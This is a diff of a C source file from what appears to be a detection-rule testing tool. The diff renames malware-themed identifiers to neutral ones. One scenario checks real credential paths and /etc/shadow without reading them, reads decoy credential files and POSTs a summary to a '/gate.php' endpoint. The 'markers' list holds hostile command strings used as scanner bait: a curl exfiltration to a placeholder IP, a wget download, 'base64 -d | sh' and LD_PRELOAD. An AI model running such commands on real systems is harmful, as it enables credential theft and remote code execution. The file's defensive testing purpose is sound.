@@ -1,17 +1,17 @@
 // SPDX-License-Identifier: GPL-3.0-only
 // Copyright (c) 2026 MikiMiku (MoreMorePwn)
 //
-// stealer.c — credential-shaped reads and detection-rule bait.
+// credential-access.c — credential-shaped reads and detection-rule markers.
 //
 // cred-read never touches a real secret: the files it opens and reads are
 // decoys written into the work directory. The standard credential locations
 // are only access()ed and stat()ed, and the result says present or absent, so
 // the syscall view gets the shape without the host's secrets leaving the guest.
 //
-// rule-bait carries the strings YARA and Sigma rules key on, writes them to a
+// rule-markers carries the strings YARA and Sigma rules key on, writes them to a
 // file for file scans, and runs a few benign discovery commands so Sigma has
 // process_creation events to match.
-#include "malware.h"
+#include "samples.h"
 
 #include <errno.h>
 #include <fcntl.h>
@@ -79,7 +79,7 @@ static int write_nested(const char *path, const char *text)
     if (!slash)
         return -1;
     *slash = 0;
-    if (mal_mkdir_p(copy) != 0)
+    if (sample_mkdir_p(copy) != 0)
         return -1;
     return write_text(path, text);
 }
@@ -96,7 +96,7 @@ static int write_nested_exclusive(const char *path, const char *text, int *creat
     if (!slash)
         return -1;
     *slash = 0;
-    if (mal_mkdir_p(copy) != 0)
+    if (sample_mkdir_p(copy) != 0)
         return -1;
     int fd = open(path, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
     if (fd < 0) {
@@ -174,7 +174,7 @@ SCENARIO(cred_read)
     const char *home = getenv("HOME");
     int use_home = options->cred_home;
     if (use_home && (!home || !*home)) {
-        mal_fail(name, "--cred-home needs HOME to be set");
+        sample_fail(name, "--cred-home needs HOME to be set");
         return 1;
     }
 
@@ -192,14 +192,14 @@ SCENARIO(cred_read)
             struct stat info;
             if (stat(path, &info) == 0) {
                 present++;
-                mal_note(name, "real %s present (%lld bytes, not read)", real_paths[i],
+                sample_note(name, "real %s present (%lld bytes, not read)", real_paths[i],
                          (long long)info.st_size);
             }
         }
     }
     struct stat shadow;
     if (stat("/etc/shadow", &shadow) == 0)
-        mal_note(name, "real /etc/shadow present (%lld bytes, not read)",
+        sample_note(name, "real /etc/shadow present (%lld bytes, not read)",
                  (long long)shadow.st_size);
 
     char base[512];
@@ -220,11 +220,11 @@ SCENARIO(cred_read)
         int written = use_home ? write_nested_exclusive(path, decoys[i].text, &created)
                                : write_nested(path, decoys[i].text);
         if (written != 0) {
-            mal_note(name, "could not write decoy %s: %s", decoys[i].relative, strerror(errno));
+            sample_note(name, "could not write decoy %s: %s", decoys[i].relative, strerror(errno));
             continue;
         }
         if (!created) {
-            mal_note(name, "%s already exists; left untouched", decoys[i].relative);
+            sample_note(name, "%s already exists; left untouched", decoys[i].relative);
             continue;
         }
         if (use_home && created_count < sizeof created_paths / sizeof created_paths[0])
@@ -232,7 +232,7 @@ SCENARIO(cred_read)
         unsigned char buffer[4096];
         ssize_t got = read_file(path, buffer, sizeof buffer);
         if (got < 0) {
-            mal_note(name, "could not read back %s: %s", decoys[i].relative, strerror(errno));
+            sample_note(name, "could not read back %s: %s", decoys[i].relative, strerror(errno));
             continue;
         }
         total += (size_t)got;
@@ -240,23 +240,23 @@ SCENARIO(cred_read)
         hash ^= file_hash;
         hash *= 16777619u;
         read_ok++;
-        mal_note(name, "read %s (%zd bytes, %08x)", decoys[i].relative, got, file_hash);
+        sample_note(name, "read %s (%zd bytes, %08x)", decoys[i].relative, got, file_hash);
     }
 
     char body[256];
     int length = snprintf(body, sizeof body, "stage=creds&files=%d&bytes=%zu&hash=%08x", read_ok,
                           total, hash);
     unsigned long long received = 0;
-    const char *host = mal_host(options);
-    int port = mal_port(options, MAL_HTTP_PORT);
+    const char *host = sample_host(options);
+    int port = sample_port(options, SAMPLE_HTTP_PORT);
     int delivered =
-        mal_http_request(host, port, "POST", "/gate.php", body, (size_t)length, &received) == 0;
+        sample_http_request(host, port, "POST", "/gate.php", body, (size_t)length, &received) == 0;
     if (!delivered)
-        mal_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
-    mal_pass(name, "%d/%zu decoy credential files read from %s, %zu bytes, exfil POST %s to %s:%d",
+        sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
+    sample_pass(name, "%d/%zu decoy credential files read from %s, %zu bytes, exfil POST %s to %s:%d",
              read_ok, sizeof decoys / sizeof decoys[0], use_home ? "$HOME" : base, total,
              delivered ? "sent" : "attempted", host, port);
-    mal_note(name, "%d/7 standard credential paths present; only stat'ed, never read", present);
+    sample_note(name, "%d/7 standard credential paths present; only stat'ed, never read", present);
     if (use_home) {
         // Always remove what this run created, even with --keep: --keep is for
         // the work directory, not for planting files in a real home.
@@ -264,13 +264,13 @@ SCENARIO(cred_read)
             unlink(created_paths[i]);
         for (size_t i = 0; i < created_count; i++)
             remove_empty_parents(created_paths[i], home);
-        mal_note(name, "removed %zu decoy files from $HOME", created_count);
+        sample_note(name, "removed %zu decoy files from $HOME", created_count);
     }
     return 0;
 }
 
 static const char *markers[] = {
-    "ANTINOMIE_MALWARE_SAMPLE_v2",
+    "ANTINOMIE_BEHAVIOR_SAMPLE_v2",
     "ANTINOMIE_CRED_DECOY",
     "T1059.004",  "T1105",     "T1055",     "T1071.001", "T1048.003",
     "T1552.001",  "T1053.003", "T1547.001", "T1620",     "T1014",
@@ -278,7 +278,7 @@ static const char *markers[] = {
     "attack.credential-access", "attack.command-and-control", "attack.exfiltration",
     "attack.discovery", "attack.privilege-escalation",
     "curl -s -X POST http://198.51.100.23/gate.php -d @/tmp/loot",
-    "wget -qO- http://198.51.100.23/stage2.bin",
+    "wget -qO- http://198.51.100.23/download.bin",
     "base64 -d | sh",
     "chmod 777 /tmp/.x",
     "LD_PRELOAD=/tmp/libx.so",
@@ -306,9 +306,9 @@ static int run_command(const char *program, char *const argv[])
     return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
 }
 
-SCENARIO(rule_bait)
+SCENARIO(rule_markers)
 {
-    const char *name = "rule-bait";
+    const char *name = "rule-markers";
     size_t count = sizeof markers / sizeof markers[0];
     char text[4096];
     size_t at = 0;
@@ -318,10 +318,10 @@ SCENARIO(rule_bait)
             break;
         at += (size_t)written;
         if (i < 4)
-            mal_note(name, "marker %s", markers[i]);
+            sample_note(name, "marker %s", markers[i]);
     }
     char path[600];
-    snprintf(path, sizeof path, "%s/rule-bait.txt", options->workdir);
+    snprintf(path, sizeof path, "%s/rule-markers.txt", options->workdir);
     int written = write_text(path, text) == 0;
 
     // Benign discovery commands: Sigma's Linux rules match process_creation
@@ -341,8 +341,8 @@ SCENARIO(rule_bait)
         if (status >= 0)
             ran++;
     }
-    mal_pass(name, "%zu markers in %s (%s), %d/%zu discovery commands executed", count, path,
+    sample_pass(name, "%zu markers in %s (%s), %d/%zu discovery commands executed", count, path,
              written ? "written" : "not written", ran, sizeof commands / sizeof commands[0]);
-    mal_note(name, "markers name MITRE techniques and Sigma tags for rule and static scans");
+    sample_note(name, "markers name MITRE techniques and Sigma tags for rule and static scans");
     return 0;
 }
